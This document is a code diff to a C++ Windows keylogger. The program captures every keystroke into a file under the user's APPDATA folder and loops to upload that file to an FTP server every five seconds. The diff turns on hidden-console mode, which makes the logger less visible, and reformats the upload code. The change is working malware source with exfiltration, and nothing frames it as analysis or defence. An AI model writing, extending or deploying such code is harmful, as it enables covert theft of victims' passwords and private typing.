@@ -17,10 +17,10 @@ const string FTP_PASSWORD = "";
 const string FILE_NAME = "keylogs.txt";
 const string LOGS_FILE_PATH = string(getenv("APPDATA")) + "\\" + FILE_NAME;
 
-// determines if the console is displayed or not (off=default)
-bool noConsole = false;
+// console display (off=default)
+bool noConsole = true;
 
-// send delay of which when the key logs file is sent to the server (measured: milliseconds)
+// delay between sending periods (measured: milliseconds)
 const int DELAY = 5000;
 
 void LogKey(char* key)
@@ -397,7 +397,7 @@ bool CaptureKeys(int key)
         LogKey((char*)"[F12]");
         return true;
 
-        // Number Keys
+    // Number Keys
     case 0x30:
         LogKey((char*)"0");
         return true;
@@ -429,7 +429,7 @@ bool CaptureKeys(int key)
         LogKey((char*)"9");
         return true;
 
-        // Punctuation Keys
+    // Punctuation Keys
     case 0xBB:
         LogKey((char*)"=");
         return true;
@@ -454,16 +454,16 @@ void FTP_SendLogs()
 {
     while (true)
     {
-        // connect to FTP server
+        // connect and upload to FTP server
         HINTERNET InternetConnection = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-
-        HINTERNET ftpSession = InternetConnectA(InternetConnection, FTP_SERVER.data(),
+        HINTERNET ftpSession = InternetConnectA
+        (
+            InternetConnection, FTP_SERVER.data(),
             INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME.data(),
             FTP_PASSWORD.data(), INTERNET_SERVICE_FTP,
-            INTERNET_FLAG_PASSIVE, 0);
-
-        // upload file
-        FtpPutFileA(ftpSession, LOGS_FILE_PATH.data(), FILE_NAME.data(), FTP_TRANSFER_TYPE_BINARY, 0);
+            INTERNET_FLAG_PASSIVE, 0
+        
+        ); FtpPutFileA(ftpSession, LOGS_FILE_PATH.data(), FILE_NAME.data(), FTP_TRANSFER_TYPE_BINARY, 0);
 
         InternetCloseHandle(InternetConnection);
         InternetCloseHandle(ftpSession);
